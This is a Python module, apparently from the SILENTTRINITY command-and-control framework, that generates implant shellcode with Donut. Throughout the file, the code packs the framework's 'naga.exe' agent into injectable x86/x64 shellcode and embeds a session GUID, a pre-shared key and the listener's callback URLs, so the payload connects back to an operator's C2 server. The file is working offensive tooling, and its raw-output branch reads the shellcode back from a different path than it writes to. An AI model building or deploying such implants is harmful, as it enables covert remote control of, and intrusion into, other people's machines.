import os
import donut
import uuid
from silenttrinity.core.teamserver.crypto import gen_stager_psk
from silenttrinity.core.utils import shellcode_to_int_byte_array, shellcode_to_hex_byte_array, get_path_in_package
from silenttrinity.core.teamserver.stager import Stager

class STStager(Stager):
    def __init__(self):
        self.name = 'shellcode'
        self.description = 'Create SILENTTRINITY Shellcode using Donut'
        self.suggestions = ''
        self.extension = 'bin'
        self.author = '@ozzieoffsec, @OOffsec'
        self.options = {
            'Architecture' : {
                'Description'   :   'Architecture of process to inject into (x64, x86, x64+x86). [Warning: getting this wrong will crash things]',
                'Required'      :   False,
                'Value'         :   'x64+x86'
	   },
            'Format' : {
		'Description'   :   'Select the output type:  raw, hex, int [All Format types output into a .bin file]',
		'Required'      :   False,
                'Value'         :   'raw'
	   }
}

    def generate(self, listener):

        guid = uuid.uuid4()
        psk = gen_stager_psk()

        c2_urls = ','.join(
            filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
            )

        #Determine which architecture to use.
        #Default is amd64+86 (dual-mode)
        arch = 3

        #User can specify 64-bit or 32-bit
        if self.options['Architecture']['Value'] == 'x64':
            arch = 2
        elif self.options['Architecture']['Value'] == 'x86':
            arch = 1

        # Create the shellcode using donut
        donut_shellcode = donut.create(file=get_path_in_package('core/teamserver/data/naga.exe'), params=f"{guid};{psk};{c2_urls}", arch=arch)

        if self.options['Format']['Value'] == 'raw':
                try:
                    f = open("shellcode.bin", "wb")
                    f.write(donut_shellcode)
                    f.close()
                    with open(get_path_in_package('../shellcode.bin'), 'rb') as bin:
                         return guid, psk, bin.read().decode('latin-1')
                finally:
                     os.remove("shellcode.bin")

        elif self.options['Format']['Value'] == 'int':
            shellcode = shellcode_to_int_byte_array(donut_shellcode)
            return guid, psk, shellcode

        elif self.options['Format']['Value'] == 'hex':
            shellcode = shellcode_to_hex_byte_array(donut_shellcode)
            return guid, psk, shellcode
